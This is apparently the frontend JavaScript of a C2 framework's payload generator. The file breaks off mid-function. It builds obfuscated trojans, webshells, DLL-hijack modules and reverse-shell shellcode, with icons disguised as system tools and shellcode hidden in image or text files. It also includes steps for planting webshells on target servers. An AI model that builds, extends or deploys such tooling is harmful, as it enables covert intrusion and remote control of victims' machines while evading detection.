app.renderPayloads = function() {
    // 从配置缓存读取监听地址/端口/加密设置（参考 CS: Payload 继承 Listener 配置）
    const listen = (this._settingsData && this._settingsData.listen) || {};
    const enc = (this._settingsData && this._settingsData.encryption) || {};
    // Payload 回连地址：优先 callback_host，为空时用 effective_callback_host（自动检测的本机IP）
    const payHost = listen.callback_host || listen.effective_callback_host || listen.detected_local_ip || '127.0.0.1';
    const payPort = listen.port || '5000';
    const payProto = listen.protocol || 'http';
    // 加密设置：从配置管理读取
    const encAlgo = enc.algorithm || 'aes-128-cbc';
    const encPass = enc.password || 'c2_demo_key_2024';
    // 兼容旧值
    const encAlgoNorm = encAlgo === 'aes' ? 'aes-128-cbc' : encAlgo;

    const protoOptions = ['http', 'https', 'tcp', 'websocket'].map(p =>
        `<option value="${p}"${p === payProto ? ' selected' : ''}>${p.toUpperCase()}</option>`
    ).join('');
    const encOptions = [
        {v:'aes-128-cbc', l:'AES-128-CBC'},
        {v:'aes-256-cbc', l:'AES-256-CBC'},
        {v:'rc4', l:'RC4 流加密'},
        {v:'chacha20', l:'ChaCha20'},
        {v:'xor', l:'XOR 异或'},
        {v:'none', l:'不加密'}
    ].map(o => `<option value="${o.v}"${o.v === encAlgoNorm ? ' selected' : ''}>${o.l}</option>`).join('');

    return `
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px;">
                    <div class="card" style="padding:24px;">
                        <h3 style="margin-bottom:20px; font-size:16px;"><i class="fas fa-wand-magic-sparkles" style="color:#d29922;"></i> 生成 Payload</h3>
                        <div style="font-size:11px; color:#3fb950; padding:8px 10px; background:#0d1117; border:1px solid #238636; border-radius:6px; margin-bottom:14px;">
                            <i class="fas fa-link"></i> 配置已同步: ${payHost}:${payPort} (${payProto.toUpperCase()}) | 加密: ${encAlgoNorm.toUpperCase()}
                        </div>
                        <div style="margin-bottom:14px;">
                            <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">名称</label>
                            <input type="text" class="input" id="payName" placeholder="my_payload" value="demo_payload">
                        </div>
                        <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:14px;">
                            <div>
                                <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">操作系统</label>
                                <select class="select" id="payOs" onchange="app._onPayloadOsArchChange()">
                                    <option value="windows">Windows</option>
                                    <option value="linux">Linux</option>
                                    <option value="multi">跨平台(Python/PHP/JSP)</option>
                                </select>
                            </div>
                            <div>
                                <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">架构</label>
                                <select class="select" id="payArch" onchange="app._onPayloadOsArchChange()">
                                    <option value="amd64">x64 / amd64</option>
                                    <option value="x86">x86 / i686</option>
                                    <option value="arm">ARM (armhf/arm64)</option>
                                    <option value="mips">MIPS (路由器)</option>
                                </select>
                            </div>
                        </div>
                        <div id="payHostPortRow" style="display:grid; grid-template-columns:2fr 1fr; gap:12px; margin-bottom:14px;">
                            <div>
                                <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">监听地址 (来自配置管理)</label>
                                <input type="text" class="input" id="payHost" value="${payHost}">
                            </div>
                            <div>
                                <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">端口 (来自配置管理)</label>
                                <input type="text" class="input" id="payPort" value="${payPort}">
                            </div>
                        </div>
                        <div id="payProtoRow" style="display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:14px;">
                            <div>
                                <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">通信协议 (来自配置管理)</label>
                                <select class="select" id="payProto">
                                    ${protoOptions}
                                </select>
                            </div>
                        </div>
                        <div id="payEncRow" style="display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:14px;">
                            <div>
                                <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">加密方式</label>
                                <select class="select" id="payEnc" onchange="app.toggleEncPassword(this.value)">
                                    ${encOptions}
                                </select>
                            </div>
                            <div>
                                <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">加密密码</label>
                                <input type="text" class="input" id="payEncPass" value="${encPass}" placeholder="自定义加密密钥">
                            </div>
                        </div>
                        <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:20px;">
                            <div>
                                <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">输出格式</label>
                                <select class="select" id="payFmt" onchange="app.updatePayloadDesc(this.value)">
                                    <optgroup label="--- Windows 专用 ---">
                                        <option value="exe">EXE 可执行文件 (Go交叉编译)</option>
                                        <option value="bat">BAT 批处理木马</option>
                                        <option value="ps1">PowerShell 脚本</option>
                                        <option value="dll">DLL 劫持模块 (C源码)</option>
                                    </optgroup>
                                    <optgroup label="--- Linux 专用 ---">
                                        <option value="sh">Linux Shell 脚本 (Bash)</option>
                                        <option value="shellcode">Shellcode 加载器 (C源码)</option>
                                    </optgroup>
                                    <optgroup label="--- WebShell (跨平台) ---">
                                        <option value="php">PHP WebShell</option>
                                        <option value="jsp">JSP WebShell (Tomcat)</option>
                                        <option value="aspx">ASP.NET (C# IIS)</option>
                                        <option value="asp">ASP (VBScript IIS)</option>
                                    </optgroup>
                                    <optgroup label="--- 跨平台脚本 ---">
                                        <option value="py">Python 脚本 (混淆)</option>
                                    </optgroup>
                                </select>
                            </div>
                            <div>
                                <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">混淆强度</label>
                                <select class="select" id="payObf">
                                    <option value="low">低 (原始代码)</option>
                                    <option value="medium" selected>中 (变量重命名)</option>
                                    <option value="high">高 (Base64+变量混淆+垃圾代码)</option>
                                    <option value="extreme">极高 (分块编码+重混淆)</option>
                                </select>
                            </div>
                        </div>
                        <!-- 平台兼容性提示 -->
                        <div id="compatInfo" style="font-size:11px; padding:10px; background:#0d1117; border:1px solid #238636; border-radius:6px; margin-bottom:14px;">
                            <div style="color:#3fb950; font-weight:600; margin-bottom:6px;"><i class="fas fa-check-circle"></i> 平台兼容性</div>
                            <div id="compatDetail" style="color:#8b949e; line-height:1.6;"></div>
                        </div>
                        <div style="margin-bottom:14px;">
                            <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">
                                <i class="fas fa-image"></i> 自定义图标 (仅EXE/DLL格式)
                            </label>
                            <div style="display:flex; gap:8px; align-items:center;">
                                <select class="select" id="payIcon" style="flex:1;">
                                    <option value="">默认图标</option>
                                    <optgroup label="--- 系统图标 ---">
                                        <option value="system_update">系统更新 (推荐)</option>
                                        <option value="notepad">记事本</option>
                                        <option value="calc">计算器</option>
                                        <option value="folder">文件夹</option>
                                        <option value="settings">设置</option>
                                    </optgroup>
                                </select>
                                <span style="font-size:11px; color:#6e7681;">
                                    或上传 <input type="file" id="payIconFile" accept=".ico" style="display:none;" onchange="app.handleIconUpload(this)">
                                    <a href="javascript:void(0)" onclick="document.getElementById('payIconFile').click()" style="color:#58a6ff;">.ico文件</a>
                                </span>
                            </div>
                            <div id="iconPreview" style="margin-top:8px; display:none;">
                                <img id="iconPreviewImg" style="width:32px; height:32px; vertical-align:middle;">
                                <span id="iconPreviewName" style="font-size:11px; color:#8b949e; margin-left:8px;"></span>
                            </div>
                        </div>
                        <div id="payloadDesc" style="font-size:11px; color:#6e7681; padding:10px; background:#0d1117; border-radius:6px; border:1px solid #21262d; margin-bottom:16px;">
                            <i class="fas fa-info-circle"></i> PHP WebShell，支持命令执行/文件管理/系统信息，Base64编码+eval执行+垃圾代码注入
                        </div>
                        <button class="btn btn-primary" style="width:100%; justify-content:center; padding:12px;" onclick="app.generatePayload()">
                            <i class="fas fa-rocket"></i> 生成 Payload
                        </button>
                        <!-- WebShell 使用说明（仅脚本格式显示） -->
                        <div id="webshellUsageInfo" style="margin-top:12px; padding:12px; background:#0d1117; border:1px solid #30363d; border-radius:8px; font-size:11px; color:#8b949e; display:none;">
                            <div style="color:#d29922; font-weight:600; margin-bottom:8px;"><i class="fas fa-lightbulb"></i> WebShell 使用方式（冰蝎被动模式）</div>
                            <div style="margin-bottom:6px;"><b style="color:#3fb950;">1.</b> 将生成的文件放到目标 Web 目录（如 /var/www/html/ 或 Tomcat webapps/）</div>
                            <div style="margin-bottom:6px;"><b style="color:#3fb950;">2.</b> 回到 C2 后台，进入「WebShell 管理」页面，<b>手动添加 WebShell URL</b></div>
                            <div style="margin-bottom:6px;"><b style="color:#3fb950;">3.</b> 添加时<b style="color:#f85149;">必须使用与生成时完全一致的加密方式和密码</b>（已自动同步全局配置）</div>
                            <div style="margin-bottom:6px;"><b style="color:#3fb950;">4.</b> C2 会自动验证连通性，验证成功后即可在终端/文件管理中操作</div>
                            <div style="color:#3fb950; margin-top:8px;"><i class="fas fa-check-circle"></i> 被动模式：WebShell 不回连、不自动注册，C2 主动向 WebShell 发 HTTP 请求</div>
                            <div style="color:#8b949e; margin-top:4px;"><i class="fas fa-info-circle"></i> 支持：命令执行、文件管理（列表/上传/下载/编辑/删除/重命名）、系统信息</div>
                            <div style="color:#f85149; margin-top:6px; padding:6px 8px; background:#161b22; border-radius:4px;"><i class="fas fa-exclamation-triangle"></i> 加密不一致会导致 500 错误！生成时用的算法/密码 = 添加时必须填的算法/密码</div>
                        </div>
                    </div>
                    
                    <div>
                        <div class="card" style="padding:24px; margin-bottom:20px;">
                            <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:16px;">
                                <h3 style="font-size:16px;"><i class="fas fa-list" style="color:#58a6ff;"></i> 已生成 Payload</h3>
                                ${this.payloads.length > 0 ? `
                                <button class="btn btn-danger" style="padding:4px 12px; font-size:12px;" onclick="app.clearPayloads()">
                                    <i class="fas fa-trash-alt"></i> 清空全部
                                </button>` : ''}
                            </div>
                            <div id="payloadListContainer" style="max-height:400px; overflow-y:auto;">
                                ${this.payloads.length > 0 ? this.payloads.map(p => `
                                    <div style="padding:10px; border:1px solid #21262d; border-radius:8px; margin-bottom:8px;">
                                        <div style="display:flex; align-items:center; gap:10px; margin-bottom:6px;">
                                            <i class="fas ${p.type === 'shellcode' || p.type === 'dll' ? 'fa-microchip' : p.type === 'bat' ? 'fa-file-code' : p.type === 'sh' ? 'fa-terminal' : 'fa-bomb'}" style="color:${p.type === 'shellcode' || p.type === 'dll' ? '#bc8cff' : '#f85149'};"></i>
                                            <div style="flex:1; min-width:0;">
                                                <div style="font-size:13px; font-weight:600;">${p.name}</div>
                                                <div style="font-size:11px; color:#8b949e;">${p.type} | ${p.os}/${p.arch} | ${p.protocol}</div>
                                            </div>
                                            <span class="badge badge-green" style="flex-shrink:0;">${p.encryption || 'raw'}</span>
                                            <a href="/api/payload/download/${encodeURIComponent(p.download_filename || (p.name + '.' + (p.type === 'exe' ? 'exe' : p.type)))}?token=${window.API?.token || ''}" target="_blank" style="font-size:11px; color:#58a6ff; flex-shrink:0;" title="下载">
                                                <i class="fas fa-download"></i>
                                            </a>
                                            <i class="fas fa-trash-alt" style="font-size:11px; color:#f85149; cursor:pointer; flex-shrink:0;" onclick="app.deletePayload(${p.id}, '${p.name}')" title="删除"></i>
                                        </div>
                                        ${p.delivery_url ? `
                                        <div style="display:flex; align-items:center; gap:6px; background:#0d1117; border:1px solid #238636; border-radius:4px; padding:4px 8px;">
                                            <i class="fas fa-link" style="font-size:10px; color:#3fb950;"></i>
                                            <span style="font-size:10px; color:#6e7681; flex-shrink:0;">URL:</span>
                                            <span style="font-size:10px; color:#58a6ff; flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${p.delivery_url}">${p.delivery_url}</span>
                                            <i class="fas fa-copy" style="font-size:10px; color:#8b949e; cursor:pointer;" onclick="navigator.clipboard.writeText('${p.delivery_url}'); app._notify('URL已复制','success');" title="复制URL"></i>
                                            <i class="fas fa-external-link-alt" style="font-size:10px; color:#8b949e; cursor:pointer;" onclick="window.open('${p.delivery_url}','_blank')" title="打开"></i>
                                        </div>` : ''}
                                    </div>
                                `).join('') : `
                                    <div style="text-align:center; padding:30px; color:#8b949e; font-size:13px;">暂无生成记录</div>
                                `}
                            </div>
                        </div>
                        
                        <div class="card" style="padding:24px;">
                            <h3 style="margin-bottom:16px; font-size:16px;"><i class="fas fa-mask" style="color:#bc8cff;"></i> Shellcode 伪装工具</h3>
                            <div style="font-size:12px; color:#8b949e; margin-bottom:12px;">
                                将Shellcode伪装成 PNG/TXT/HTML 等资源文件，MAGIC标记: 0xDEADBEEF
                            </div>
                            <div style="margin-bottom:10px;">
                                <label style="font-size:11px; color:#8b949e; display:block; margin-bottom:4px;">名称</label>
                                <input type="text" class="input" id="stegoName" placeholder="stego_payload" value="stego_demo" style="font-size:12px;">
                            </div>
                            <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-bottom:10px;">
                                <div>
                                    <label style="font-size:11px; color:#8b949e; display:block; margin-bottom:4px;">伪装格式</label>
                                    <select class="select" id="stegoFmt" style="font-size:12px;">
                                        <option value="png">PNG 图片</option>
                                        <option value="txt">TXT 配置文件</option>
                                        <option value="html">HTML 页面</option>
                                    </select>
                                </div>
                                <div>
                                    <label style="font-size:11px; color:#8b949e; display:block; margin-bottom:4px;">C2地址</label>
                                    <input type="text" class="input" id="stegoHost" value="${payHost}:${payPort}" style="font-size:12px;">
                                </div>
                            </div>
                            <div style="margin-bottom:12px;">
                                <label style="font-size:11px; color:#8b949e; display:block; margin-bottom:4px;">自定义Shellcode (十六进制，可选)</label>
                                <textarea class="input" id="stegoSC" placeholder="如: 0x90,0x90,0x90..." rows="2" style="font-size:11px; resize:vertical;"></textarea>
                            </div>
                            <button class="btn btn-primary" style="width:100%; justify-content:center; font-size:12px; padding:8px;" onclick="app.generateStego()">
                                <i class="fas fa-wand-magic-sparkles"></i> 生成伪装文件
                            </button>
                        </div>

                        <div class="card" style="padding:24px; margin-top:20px; border:1px solid #238636;">
                            <h3 style="margin-bottom:16px; font-size:16px;"><i class="fas fa-microchip" style="color:#3fb950;"></i> Shellcode 自动生成 (参考 MSF msfvenom)</h3>
                            <div style="font-size:12px; color:#8b949e; margin-bottom:12px;">
                                参考 <code style="color:#58a6ff;">msfvenom -p &lt;payload&gt; LHOST=x LPORT=y -f &lt;format&gt;</code> 自动生成 shellcode
                            </div>
                            <div style="margin-bottom:10px;">
                                <label style="font-size:11px; color:#8b949e; display:block; margin-bottom:4px;">Payload 类型</label>
                                <select class="select" id="msfPayload" style="font-size:12px;" onchange="app.toggleCustomCmd(this.value)">
                                    <optgroup label="--- Windows x64 ---">
                                        <option value="windows/x64/messagebox">windows/x64/messagebox (弹窗·无害)</option>
                                        <option value="windows/x64/calculator">windows/x64/calculator (计算器·无害)</option>
                                        <option value="windows/x64/shell_reverse_tcp">windows/x64/shell_reverse_tcp</option>
                                        <option value="windows/x64/shell_bind_tcp">windows/x64/shell_bind_tcp</option>
                                        <option value="windows/x64/meterpreter_reverse_tcp">windows/x64/meterpreter_reverse_tcp</option>
                                        <option value="windows/x64/meterpreter_reverse_http">windows/x64/meterpreter_reverse_http</option>
                                    </optgroup>
                                    <optgroup label="--- Linux x64 ---">
                                        <option value="linux/x64/shell_reverse_tcp">linux/x64/shell_reverse_tcp</option>
                                        <option value="linux/x64/shell_bind_tcp">linux/x64/shell_bind_tcp</option>
                                    </optgroup>
                                    <optgroup label="--- Linux ARM (IoT/路由器) ---">
                                        <option value="linux/armle/shell_reverse_tcp">linux/armle/shell_reverse_tcp (小端)</option>
                                        <option value="linux/armbe/shell_reverse_tcp">linux/armbe/shell_reverse_tcp (大端)</option>
                                    </optgroup>
                                    <optgroup label="--- Linux MIPS (路由器) ---">
                                        <option value="linux/mipsle/shell_reverse_tcp">linux/mipsle/shell_reverse_tcp (小端)</option>
                                        <option value="linux/mipsbe/shell_reverse_tcp">linux/mipsbe/shell_reverse_tcp (大端)</option>
                                    </optgroup>
                                    <optgroup label="--- Windows x86 ---">
                                        <option value="windows/x86/shell_reverse_tcp">windows/x86/shell_reverse_tcp</option>
                                        <option value="windows/x86/messagebox">windows/x86/messagebox (弹窗·无害)</option>
                                    </optgroup>
                                    <optgroup label="--- 自定义 ---">
                                        <option value="custom/cmd">custom/cmd (自定义命令执行)</option>
                                    </optgroup>
                                </select>
                            </div>
                            <div id="customCmdBox" style="display:none; margin-bottom:10px; padding:12px; background:#0d1117; border:1px solid #d29922; border-radius:6px;">
                                <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
                                    <label style="font-size:11px; color:#d29922; flex-shrink:0;">
                                        <i class="fas fa-desktop"></i> 目标系统
                                    </label>
                                    <select class="select" id="msfTargetOs" style="max-width:240px; font-size:12px;">
                                        <option value="linux">Linux x64 (execve /bin/sh -c)</option>
                                        <option value="windows">Windows x64 (WinExec PEB walking)</option>
                                    </select>
                                </div>
                                <label style="font-size:11px; color:#d29922; display:block; margin-bottom:4px;">
                                    <i class="fas fa-terminal"></i> 自定义命令 (custom_cmd)
                                </label>
                                <input type="text" class="input" id="msfCustomCmd" placeholder="如: whoami / net user / id / uname -a" style="font-size:12px;">
                                <div style="font-size:10px; color:#6e7681; margin-top:4px;">
                                    <b style="color:#3fb950;">Linux:</b> execve("/bin/sh",["/bin/sh","-c",cmd],NULL) 真实可执行 shellcode<br>
                                    <b style="color:#58a6ff;">Windows:</b> WinExec(cmd,SW_HIDE) shellcode (PEB walking 解析 kernel32)<br>
                                    选 <b>exe_loader</b> 格式可直接编译执行（内置 system() + shellcode 双模式）
                                </div>
                            </div>
                            <div style="display:grid; grid-template-columns:2fr 1fr; gap:8px; margin-bottom:10px;">
                                <div>
                                    <label style="font-size:11px; color:#8b949e; display:block; margin-bottom:4px;">LHOST (监听地址)</label>
                                    <input type="text" class="input" id="msfLhost" value="${payHost}" style="font-size:12px;">
                                </div>
                                <div>
                                    <label style="font-size:11px; color:#8b949e; display:block; margin-bottom:4px;">LPORT (端口)</label>
                                    <input type="text" class="input" id="msfLport" value="${payPort}" style="font-size:12px;">
                                </div>
                            </div>
                            <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-bottom:10px;">
                                <div>
                                    <label style="font-size:11px; color:#8b949e; display:block; margin-bottom:4px;">输出格式 (-f)</label>
                                    <select class="select" id="msfFormat" style="font-size:12px;">
                                        <option value="c">C 数组 (c)</option>
                                        <option value="python">Python (python)</option>
                                        <option value="hex">十六进制 (hex)</option>
                                        <option value="raw">原始二进制 (raw)</option>
                                        <option value="exe_loader">C 加载器源码 (exe_loader)</option>
                                    </select>
                                </div>
                                <div>
                                    <label style="font-size:11px; color:#8b949e; display:block; margin-bottom:4px;">编码器 (-e)</label>
                                    <select class="select" id="msfEncoder" style="font-size:12px;">
                                        <option value="none">none (不编码)</option>
                                        <option value="xor">xor/encoder (XOR 0x55)</option>
                                        <option value="base64">base64 (Base64编码)</option>
                                    </select>
                                </div>
                            </div>
                            <div style="margin-bottom:12px;">
                                <label style="font-size:11px; color:#8b949e; display:block; margin-bottom:4px;">输出名称</label>
                                <input type="text" class="input" id="msfName" value="msf_shellcode" style="font-size:12px;">
                            </div>
                            <button class="btn btn-primary" style="width:100%; justify-content:center; font-size:12px; padding:10px; background:#238636;" onclick="app.generateShellcodeMSF()">
                                <i class="fas fa-bolt"></i> 生成 Shellcode (msfvenom 风格)
                            </button>
                        </div>
                    </div>
                </div>
            `;
};

app.payloadDescs = {
    'php': 'PHP WebShell（冰蝎模式），支持命令执行/文件管理/系统信息，变量重命名+垃圾代码混淆，跨平台通用',
    'jsp': 'JSP WebShell（冰蝎被动模式），支持AES/XOR加密，Java ProcessBuilder执行命令，部署到Tomcat等Java容器',
    'aspx': 'ASP.NET (C#) WebShell，WebClient通信，Process执行命令，IIS专用',
    'asp': 'ASP (VBScript) WebShell，WinHttp通信，WScript.Shell执行命令，IIS专用',
    'py': 'Python 脚本木马，requests通信，subprocess执行命令，Base64分块编码+exec执行，跨平台',
    'exe': '生成 Go agent 源码，用 Go 交叉编译为轻量 PE 二进制（CGO_ENABLED=0）。体积小、特征少、跨平台一致，无需 Python/mingw 依赖',
    'bat': '生成 BAT 批处理木马，内嵌 Base64 编码的 PowerShell Agent',
    'ps1': '生成 PowerShell 脚本木马，支持内存执行 / EncodedCommand',
    'sh': '生成 Linux Bash 脚本木马，curl 通信，伪装 [kworker] 进程',
    'shellcode': '生成 C 语言 Shellcode 加载器，自动检测 mingw 交叉编译为 EXE（参考 MSF msfvenom）',
    'dll': '生成 DLL 劫持模块 C 源码，version.dll 代理转发 + 静默 Agent',
};

app.updatePayloadDesc = function(val) {
    try {
        const el = document.getElementById('payloadDesc');
        if (el) el.innerHTML = '<i class="fas fa-info-circle"></i> ' + (this.payloadDescs[val] || '');

        // WebShell / 脚本格式自动设置平台
        const osSelect = document.getElementById('payOs');
        const archSelect = document.getElementById('payArch');
        if (osSelect && archSelect) {
            const info = this._payloadCompat[val];
            if (info) {
                if (info.os.includes('multi')) {
                    osSelect.value = 'multi';
                    osSelect.disabled = true;
                    archSelect.disabled = true;
                } else if (info.os.length === 1) {
                    osSelect.value = info.os[0];
                    osSelect.disabled = true;
                    archSelect.disabled = false;
                } else {
                    osSelect.disabled = false;
                    archSelect.disabled = false;
                }
            }
        }

        // 更新兼容性提示
        const os = osSelect ? osSelect.value : '';
        const arch = archSelect ? archSelect.value : '';
        this._updateCompatInfo(val, os, arch);

        // WebShell 使用说明显示/隐藏
        const wsInfo = document.getElementById('webshellUsageInfo');
        const webshellTypes = ['php', 'jsp', 'aspx', 'asp'];
        const isWebshell = webshellTypes.includes(val);
        if (wsInfo) wsInfo.style.display = isWebshell ? 'block' : 'none';

        // WebShell 是被动模式，不需要 IP/端口/协议，但保留加密方式和密码
        const hostPortRow = document.getElementById('payHostPortRow');
        const protoRow = document.getElementById('payProtoRow');
        const encRow = document.getElementById('payEncRow');
        if (hostPortRow) hostPortRow.style.display = isWebshell ? 'none' : '';
        if (protoRow) protoRow.style.display = isWebshell ? 'none' : '';
        if (encRow) encRow.style.display = '';

        // WebShell 格式额外提示
        if (isWebshell && el) {
            el.innerHTML += '<br><b style="color:#d29922;">注意:</b> WebShell 是被动模式，不需要设置 IP/端口/协议。部署后到「WebShell 管理」页面手动添加 URL，添加时可独立配置加密/密码/HTTP头/超时/代理。';
        }
    } catch(e) {
        console.error('updatePayloadDesc error:', e);
    }
};

// Payload 平台兼容性信息表
app._payloadCompat = {
    'exe':    { os: ['windows'], arch: ['amd64','x86'], desc: 'Go agent源码+Go交叉编译为PE二进制，体积小特征少，无需外部依赖。', runtime: '无需依赖' },
    'bat':    { os: ['windows'], arch: ['amd64','x86','arm'], desc: 'Windows批处理，内嵌PowerShell。所有Windows架构通用。', runtime: '需PowerShell' },
    'ps1':    { os: ['windows'], arch: ['amd64','x86','arm'], desc: 'PowerShell脚本，支持内存执行。所有Windows架构通用。', runtime: '需PowerShell 5.0+' },
    'dll':    { os: ['windows'], arch: ['amd64','x86'], desc: 'DLL劫持C源码，需用MinGW/MSVC编译。适用于DLL侧加载。', runtime: '需编译为DLL' },
    'sh':     { os: ['linux'], arch: ['amd64','x86','arm','mips'], desc: 'Bash脚本，依赖curl命令。所有Linux架构通用(路由器/IoT)。', runtime: '需bash+curl' },
    'shellcode': { os: ['linux','windows'], arch: ['amd64','x86','arm'], desc: 'C语言加载器源码，跨平台。需用目标架构的gcc交叉编译。', runtime: '需gcc编译' },
    'php':    { os: ['multi'], arch: ['amd64','x86','arm'], desc: 'PHP WebShell，部署到Web服务器(Apache/Nginx+PHP)。跨架构通用。', runtime: '需PHP 5.4+' },
    'jsp':    { os: ['multi'], arch: ['amd64','x86','arm'], desc: 'JSP WebShell，部署到Tomcat/WebLogic等Java容器。', runtime: '需JDK 1.7+' },
    'aspx':   { os: ['windows'], arch: ['amd64','x86'], desc: 'ASP.NET WebShell，部署到IIS。需.NET Framework。', runtime: '需IIS+.NET' },
    'asp':    { os: ['windows'], arch: ['amd64','x86'], desc: 'ASP WebShell(VBScript)，部署到IIS。老式Windows服务器。', runtime: '需IIS+ASP支持' },
    'py':     { os: ['multi'], arch: ['amd64','x86','arm','mips'], desc: 'Python脚本，跨平台跨架构。可chmod+x后直接运行。', runtime: '需Python 3.6+' },
};

// 操作系统/架构改变时更新兼容性提示
app._onPayloadOsArchChange = function() {
    const fmt = document.getElementById('payFmt')?.value;
    const os = document.getElementById('payOs')?.value;
    const arch = document.getElementById('payArch')?.value;
    this._updateCompatInfo(fmt, os, arch);
};

app._updateCompatInfo = function(fmt, os, arch) {
    const detail = document.getElementById('compatDetail');
    if (!detail) return;
    const info = this._payloadCompat[fmt];
    if (!info) {
        detail.innerHTML = '<span style="color:#8b949e;">未知格式</span>';
        return;
    }
    const osOk = info.os.includes(os) || info.os.includes('multi');
    const archOk = info.arch.includes(arch);
    const osBadge = osOk ? '<span class="badge badge-green">✓ '+os+'</span>' : '<span class="badge badge-red">✗ '+os+'</span>';
    const archBadge = archOk ? '<span class="badge badge-green">✓ '+arch+'</span>' : '<span class="badge badge-red">✗ '+arch+'</span>';
    detail.innerHTML = `
        <div style="display:flex; gap:8px; margin-bottom:6px;">操作系统: ${osBadge} 架构: ${archBadge}</div>
        <div style="color:#6e7681; margin-bottom:4px;">${info.desc}</div>
        <div style="color:#d29922;">运行依赖: ${info.runtime}</div>
    `;
};

app.toggleEncPassword = function(encType) {
    const passDiv = document.getElementById('payEncPass').parentElement;
    if (encType === 'none') {
        passDiv.style.display = 'none';
    } else {
        passDiv.style.display = '';
    }
};

app.generatePayload = function() {
    const btn = document.querySelector('[onclick="app.generatePayload()"]');
    const type = document.getElementById('payFmt').value;
    const name = document.getElementById('payName').value;
    const host = document.getElementById('payHost').value;
    const port = document.getElementById('payPort').value;

    if (!name) { this._notify('请输入Payload名称', 'error'); return; }

    // WebShell 是被动模式，不需要 host/port/protocol
    const webshellTypes = ['php', 'jsp', 'aspx', 'asp'];
    const isWebshell = webshellTypes.includes(type);
    if (!isWebshell) {
        if (!host) { this._notify('请输入监听地址', 'error'); return; }
        if (!port) { this._notify('请输入监听端口', 'error'); return; }
    }

    const data = {
        name: name,
        type: type,
        os: document.getElementById('payOs').value,
        arch: document.getElementById('payArch').value,
        listen_host: isWebshell ? '' : host,
        listen_port: isWebshell ? 0 : parseInt(port),
        protocol: isWebshell ? 'http' : document.getElementById('payProto').value,
        encryption: document.getElementById('payEnc').value,
        enc_password: document.getElementById('payEncPass').value,
        obfuscation: document.getElementById('payObf').value,
        icon_path: document.getElementById('payIcon').value
    };
    
    const slowTypes = ['exe', 'dll', 'exe_raw', 'dll_raw', 'dotnet', 'vbs', 'msi'];
    const isSlow = slowTypes.includes(type);
    let loadingToast;
    
    if (btn) { btn.disabled = true; btn.style.opacity = '0.6'; }
    if (isSlow) {
        loadingToast = this._notify(`正在生成 ${type.toUpperCase()} 文件，请稍候（可能需要1-3分钟）...`, 'loading', 0);
    }
    
    API.post('/api/payload/generate', data).then(res => {
        if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
        if (loadingToast) loadingToast.remove();
        if (res.success) {
            this.showCodeModal(res.filename, res.full_code || res.code_preview, res.is_binary, res.delivery_url);
            this.loadPayloads();
            this._notify('Payload生成成功: ' + res.filename, 'success');
        } else {
            this._notify('生成失败: ' + (res.error || '未知错误'), 'error');
        }
    }).catch(err => {
        if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
        if (loadingToast) loadingToast.remove();
        this._notify('生成失败: ' + (err.message || err), 'error');
    });
};

app.handleIconUpload = function(input) {
    if (!input.files || !input.files[0]) return;
    const file = input.files[0];
    if (!file.name.endsWith('.ico')) {
        this._notify('请选择 .ico 格式的图标文件', 'error');
        return;
    }
    if (file.size > 2 * 1024 * 1024) {
        this._notify('图标文件不能超过 2MB', 'error');
        return;
    }
    
    const loading = this._notify('正在上传图标...', 'loading', 0);
    const formData = new FormData();
    formData.append('icon', file);
    fetch('/api/payload/icon/upload', {
        method: 'POST',
        body: formData,
        headers: { 'Authorization': 'Bearer ' + (API.token || localStorage.getItem('c2_token') || '') }
    }).then(r => r.json()).then(res => {
        loading.remove();
        if (res.success) {
            document.getElementById('payIcon').value = res.filename;
            document.getElementById('iconPreview').style.display = 'block';
            document.getElementById('iconPreviewName').textContent = res.filename;
            this._notify('图标上传成功', 'success');
        } else {
            this._notify('上传失败: ' + (res.error || '未知错误'), 'error');
        }
    }).catch(err => {
        loading.remove();
        this._notify('上传失败: ' + (err.message || err), 'error');
    });
    input.value = '';
};

app.generateStego = function() {
    const name = document.getElementById('stegoName').value;
    const hostPort = document.getElementById('stegoHost').value.split(':');
    const sc = document.getElementById('stegoSC').value;

    if (!name) { this._notify('请输入文件名称', 'error'); return; }
    if (!sc) { this._notify('请输入Shellcode', 'error'); return; }

    const data = {
        name: name,
        format: document.getElementById('stegoFmt').value,
        shellcode: sc,
        listen_host: hostPort[0] || '127.0.0.1',
        listen_port: parseInt(hostPort[1]) || 5000,
        protocol: 'http'
    };

    const loading = this._notify('正在生成伪装资源文件...', 'loading', 0);
    API.post('/api/payload/shellcode/stego', data).then(res => {
        loading.remove();
        if (res.success) {
            const info = `[伪装资源文件]\n格式: ${res.content_type}\n文件大小: ${res.file_size} bytes\nShellcode大小: ${res.shellcode_size} bytes\nMAGIC标记: ${res.magic}\n加密方式: ${res.encryption}\n\n${res.note}`;
            this.showCodeModal(res.filename, info, true);
            this.loadPayloads();
            this._notify('伪装文件生成成功', 'success');
        } else {
            this._notify('生成失败: ' + (res.error || '未知错误'), 'error');
        }
    }).catch(err => {
        loading.remove();
        this._notify('生成失败: ' + (err.message || err), 'error');
    });
};

// 切换自定义命令输入框显示
app.toggleCustomCmd = function(payloadVal) {
    const box = document.getElementById('customCmdBox');
    if (!box) return;
    box.style.display = (payloadVal === 'custom/cmd') ? 'block' : 'none';
};

// MSF 风格 shellcode 生成（参考 msfvenom）
app.generateShellcodeMSF = function() {
